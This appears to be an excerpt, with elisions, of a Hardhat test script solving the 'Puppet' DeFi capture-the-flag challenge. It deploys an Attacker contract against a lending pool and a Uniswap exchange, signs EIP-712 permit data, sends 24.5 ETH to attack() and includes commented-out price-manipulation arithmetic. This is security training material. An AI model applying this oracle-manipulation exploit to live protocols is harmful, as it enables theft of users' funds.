  ...
  it('Execution', async function () {
    ...
    const attacker = await (
        await ethers.getContractFactory(
          'contracts/puppet/Attacker.sol:Attacker',
          deployer
        )
      ).deploy(lendingPool.address, uniswapExchange.address, token.address);
    ...
    const typedData = {
      ...
      domain: {
        ...
        version: '1',
        chainId: await ethers.provider.network.chainId,
    ...
    // sign type v4
    const signature = await player._signTypedData(
      typedData.domain,
      typedData.types,
      typedData.message
    );
    ...
    await attacker
      .connect(player)
      .attack(typedData.message, signature, {
        value: ethers.utils.parseEther('24.5'),
      });
    ...
    // check player eth balance
    console.log(
      'player eth balance',
      ethers.utils.formatEther(await ethers.provider.getBalance(player.address))
    );

    // const outputEth = await uniswapExchange.getTokenToEthInputPrice(
    //   PLAYER_INITIAL_TOKEN_BALANCE,
    //   { gasLimit: 1e6 }
    // );
    // console.log('outputEth', ethers.utils.formatEther(outputEth.toString()));

    // const depositRequired = ethers.BigNumber.from(POOL_INITIAL_TOKEN_BALANCE)
    //   .mul(
    //     (await ethers.provider.getBalance(uniswapExchange.address)).sub(
    //       outputEth
    //     )
    //   )
    //   .div(
    //     (await token.balanceOf(uniswapExchange.address)).add(
    //       PLAYER_INITIAL_TOKEN_BALANCE
    //     )
    //   )
    //   .mul(await lendingPool.DEPOSIT_FACTOR());
